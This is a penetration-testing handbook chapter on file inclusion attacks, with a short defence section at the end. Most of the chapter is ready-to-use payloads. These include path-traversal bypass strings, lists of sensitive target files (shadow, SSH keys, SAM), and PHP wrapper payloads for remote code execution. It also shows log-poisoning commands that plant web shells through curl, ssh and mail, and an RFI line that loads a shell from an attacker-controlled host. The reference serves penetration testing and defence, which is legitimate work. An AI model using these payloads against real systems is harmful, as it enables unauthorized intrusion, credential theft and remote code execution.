# 27 — File Inclusion

Local File Inclusion (LFI) reads or executes server-side files; Remote File Inclusion (RFI) loads a file from a URL the attacker controls. Both stem from passing untrusted input to a file-loading API (`include`, `require`, `fread`, `<jsp:include>`, `Razor`, `ssi`, `freemarker`).

## Contents

- [Detection](#detection)
- [Common interesting paths](#common-interesting-paths)
- [Path-traversal bypasses](#path-traversal-bypasses)
- [PHP wrappers — the high-leverage primitives](#php-wrappers-the-high-leverage-primitives)
- [Log poisoning → RCE via LFI](#log-poisoning-rce-via-lfi)
- [RFI — when the include accepts URLs](#rfi-when-the-include-accepts-urls)
- [Discovery wordlists](#discovery-wordlists)
- [Defending (for the report)](#defending-for-the-report)
- [Sources](#sources)

## Detection

Look for parameters that name a page, theme, locale, or template:

```
?page=home
?file=about.html
?lang=en
?template=default
?include=footer
?path=/data/x.txt
```

Test progressively:

```
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00          # null-byte (PHP <5.3.4)
?file=....//....//....//etc/passwd        # nested ../ to bypass strip-once filters
?file=..%2f..%2f..%2fetc%2fpasswd         # URL-encode
?file=%252e%252e%252f...                  # double URL-encode
?file=..\..\..\..\windows\win.ini         # Windows
```

A successful LFI usually returns the file content, sometimes with HTML still wrapping it.

## Common interesting paths

### Linux

```
/etc/passwd
/etc/shadow                              (root only)
/etc/hosts
/etc/hostname
/etc/issue
/etc/group
/etc/sudoers
/etc/crontab
/etc/cron.d/*
/etc/network/interfaces
/etc/resolv.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/*
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/*
/etc/php/<v>/apache2/php.ini
/etc/ssh/sshd_config
/etc/ssh/ssh_host_*_key                  (root only)
/proc/self/environ                       (env vars of current request)
/proc/self/cmdline
/proc/self/status
/proc/self/fd/<N>
/proc/<pid>/cmdline
/proc/<pid>/environ
/proc/version
/proc/cmdline
/proc/net/fib_trie
/proc/net/tcp                             (listening sockets)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog
/var/mail/<user>
/home/<user>/.bash_history
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
```

### Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\system.ini
C:\Windows\debug\NetSetup.log
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\*.log
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\NTUSER.DAT
C:\ProgramData\Microsoft\Group Policy\History
```

## Path-traversal bypasses

```
../../../etc/passwd
../../../etc/passwd%00                 # null byte (PHP <5.3.4 only)
....//....//....//etc/passwd            # filter strips a single ../
..//..//..//etc/passwd
..\..\..\etc\passwd                    # backslash on Windows; sometimes accepted
..%2f..%2f..%2fetc%2fpasswd            # URL-encoded
..%252f..%252fetc%252fpasswd           # double-encoded
%2e%2e%2f%2e%2e%2f                     # full URL-encode
..%c0%af..%c0%afetc%c0%afpasswd        # over-long UTF-8 (legacy)
..%ef%bc%8f..%ef%bc%8fetc..             # full-width slash
```

If the script appends `.php` (`include($_GET['p'].'.php')`):

```
?p=../../../../etc/passwd%00            # null byte
?p=php://filter/convert.base64-encode/resource=index   # wrappers ignore the suffix when used right
?p=../../../../etc/passwd%23            # %23 = '#' (sometimes only fragments dropped)
```

If the script *prepends* a path (`include('/var/www/views/'.$_GET['p'])`):

```
?p=../../../etc/passwd
?p=../../../../etc/hostname
```

## PHP wrappers — the high-leverage primitives

PHP's stream wrappers turn LFI into many other primitives.

### `php://filter` — read source

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=../config.php
?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

Decode the base64 to recover source. Use `read=string.rot13` chains to obfuscate detections by simple WAFs.

### `php://input` — RCE via POST body

When `allow_url_include=On` (rarer in modern PHP):

```bash
curl -X POST 'https://target/page?file=php://input' --data '<?php system($_GET["c"]); ?>&c=id'
```

### `data://` — RCE inline

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
?file=data://text/plain,<?php system($_GET[c])?>&c=id
```

### `expect://` — direct command execution

If the `expect` PHP extension is loaded:

```
?file=expect://id
```

### `phar://` — deserialization gadget

Triggers PHP unserialize on metadata when the file is opened via `phar://`. Exploitable when the app loads a tainted file path with any function that resolves the wrapper (`file_exists`, `filesize`, `fopen`, `is_file`, etc.).

```
?file=phar:///tmp/upload.jpg/x
```

### `zip://`

```
?file=zip:///tmp/upload.zip%23shell.php
```

(`%23` = `#`, separating archive path and inner file name.)

## Log poisoning → RCE via LFI

When you can write to a log the application later includes:

### Apache / nginx access logs

1. Place PHP code in a request header that the log records (commonly `User-Agent`).

```bash
curl 'https://target/' -A '<?php system($_GET["c"]); ?>'
```

2. Then include the log file:

```
?file=../../../../var/log/apache2/access.log&c=id
```

If header parsing breaks PHP (e.g. quotes get escaped), encode the payload differently or use a 404 path so the URL field carries the payload:

```bash
curl 'https://target/<?php%20system($_GET[c]);%20?>'
?file=../../../../var/log/apache2/access.log&c=id
```

### SSH auth log

If `/var/log/auth.log` is readable by the web user, an SSH attempt with PHP code in the username gets logged:

```bash
ssh '<?php system($_GET[c]); ?>'@target
?file=../../../../var/log/auth.log&c=id
```

### Mail / `/var/mail/<user>`

```bash
echo '<?php system($_GET[c]); ?>' | mail -s test www-data@target
?file=../../../../var/mail/www-data&c=id
```

### `/proc/self/environ`

Older setups exposed env vars in `/proc/self/environ`; if accessible *and* writable indirectly (custom CGI scripts), poison `User-Agent` and include the file. On modern kernels `/proc/self/environ` is mode `0400` (owner only).

### PHP session files

If session files are stored in `/var/lib/php/sessions/` and you control any session value, write PHP and include:

```
?file=../../../../var/lib/php/sessions/sess_<your-session-id>
```

### `/proc/self/fd/<n>` for open files

On targets where `/var/log/...` paths are filtered but `/proc/self/fd/<n>` reaches the same fd:

```
?file=/proc/self/fd/3
?file=/proc/self/fd/4
?file=/proc/self/fd/5...                # try a few; web server's open log fds
```

## RFI — when the include accepts URLs

PHP `allow_url_include=On` (and `allow_url_fopen=On`) is required.

```
?file=http://attacker/shell.txt
```

`shell.txt` on attacker:

```php
<?php system($_GET['c']); ?>
```

Other languages:

- **JSP**: `<jsp:include page="USER_INPUT" />`, `<%@ include file="USER_INPUT" %>` — file inclusion within the same context; rarely accepts URLs but can read JSPs.
- **Java Servlet**: `request.getRequestDispatcher(USER_INPUT).include(req,resp)` — server-internal forward.
- **ASP.NET**: `Server.Execute(USER_INPUT)`, `<!--#include virtual="USER_INPUT"-->`.
- **Python**: `open(USER_INPUT)`, `Flask render_template(USER_INPUT)` (also see SSTI in [30](30-web-attacks.md)).
- **Node**: `require(USER_INPUT)`, `fs.readFile(USER_INPUT)`, `res.sendFile(USER_INPUT)`.

## Discovery wordlists

```
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathstoTest.txt
```

Quick fuzz with FFuF:

```bash
ffuf -u 'https://target/page?file=FUZZ' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mr 'root:x:0|\[boot loader\]'                  # match a string from a real file
```

Tools:

```bash
liffy -u 'https://target/page?file=' -p data
kadimus -u 'https://target/page?file=__FILE__'
```

## Defending (for the report)

- Validate the input against an allowlist of known files / IDs (best).
- Treat the user input as a key, not as a path — map `id=1` → `/views/home.html` server-side.
- Reject any input containing `..`, `/`, `\`, NUL, `:`.
- Disable `allow_url_include` and `allow_url_fopen` in PHP unless explicitly needed.
- Run the web user with no read access to sensitive files (`/etc/shadow`, SSH keys).
- Strip / sanitize wrappers (`php://`, `data://`, `phar://`, `expect://`).
- Keep app and language patched; many bypass tricks (null byte, double encode) only work on old versions.

## Sources

- OWASP — Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- HackTricks — File Inclusion: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
- PayloadsAllTheThings — File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- PHP wrappers: https://www.php.net/manual/en/wrappers.php
